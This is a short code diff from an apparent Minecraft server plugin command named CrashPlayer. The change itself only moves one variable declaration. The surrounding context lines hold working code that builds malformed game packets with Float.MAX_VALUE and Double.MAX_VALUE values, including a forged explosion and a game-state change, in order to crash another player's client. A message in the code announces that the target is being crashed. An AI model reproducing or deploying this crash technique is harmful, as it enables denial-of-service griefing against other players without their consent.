@@ -28,10 +28,10 @@ public class CrashPlayer extends Command {
                 }
                 p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " is being crashed using combined method (packet, health and particles)!");
                 new BukkitRunnable() {
-                    int times = 0;
                     final Class<?> vec3D = ReflectionUtils.getClassCached("{nms}.Vec3D");
                     final Object packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
                     final Object packetPlayOutExplosion = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutExplosion"), double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), ReflectionUtils.getConstructorCached(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
+                    int times = 0;
 
                     @Override
                     public void run() {
